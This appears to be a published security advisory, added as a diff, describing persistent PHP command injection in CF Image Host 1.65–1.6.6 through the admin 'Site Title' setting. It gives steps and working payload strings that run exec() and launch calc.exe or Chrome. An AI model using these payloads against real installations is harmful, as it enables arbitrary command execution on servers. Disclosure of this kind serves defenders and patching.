@@ -1,0 +1,132 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-CFIMAGEHOST-PHP-CMD-INJECTION.txt
+
+
+Vendor:
+====================================
+codefuture.co.uk/projects/imagehost
+
+
+Product:
+===================================
+CF Image Host 1.65 - 1.6.6
+
+Archive download listed as: version 1.65
+unzips as imagehost 1.6.6
+
+
+Vulnerability Type:
+=====================
+PHP Command Injection
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+CF Imagehost allows users who have access to the management area the
+ability to write directly to the 'set.php' page under
+the /inc directory that stores setting values for the 'Site Title', 'Site
+Slogan' etc, this allows a local attacker ability to
+inject specially crafted PHP command payloads to execute arbitrary
+operating system commands on the victim host. Possibly leading
+to privilege escalation, RFI, backdoors etc.. and most likely full
+compromise of the affected system or shared environment
+if applicable.
+
+
+PHP Command Injection Exploit code(s):
+=====================================
+
+Under the setting tab we can inject following below PHP code and it will
+remain persistent as it is written disk in 'set.php',
+afterwards when the victim visits the application and click a tab the
+persistent OS command will be executed.
+
+
+1) navigate to CF image host settings tab
+http://localhost/imagehost1.6.6/admin.php?act=set
+2) click on admin menu on left and enter your passwords DO NOT click 'Save
+changes' yet! or you get error message to enter creds
+3) now go back to settings tab and click 'General' then inject below PHP
+code into the 'Site Title' input field
+4) now click 'Save Changes', this code will get stored under  /inc
+directory within the 'set.php' PHP file.
+
+our PHP injection payload needs the single quotes, double back slashes,
+semicolons as described below to correctly escape the syntax
+so we do not break the PHP page and cause errors, our extra \\ quoutes and
+; gets removed after injection takes place.
+
+some examples...
+
+
+';echo exec("c:\\Windows\\system32\\calc.exe");'';';
+
+'set.php' on line 11 then becomes:
+$settings['SET_TITLE'] = '';echo
+exec("c:\Windows\system32\calc.exe");'';';';
+
+OR inject CMD to launch chrome.exe etc...
+
+';echo exec("c:\\Program Files
+(x86)\\Google\\Chrome\\Application\\chrome.exe");'';';
+
+
+After, click on some tabs above like 'Database' or 'Ban User' and Tada!
+this will execute our stored PHP command...
+either running calc.exe or launching Google Chrome.
+
+
+
+Disclosure Timeline:
+=====================
+Vendor Notification:  NA
+November 13, 2015  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Local / Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+================================================================
+
+Request Method(s):            [+] POST
+
+
+Vulnerable Product:           [+] CF Image Host 1.65 - 1.6.6
+
+
+Vulnerable Parameter(s):      [+] 'Site Title', 'Site Slogan' etc..
+
+
+Affected Area(s):             [+]  OS
+
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
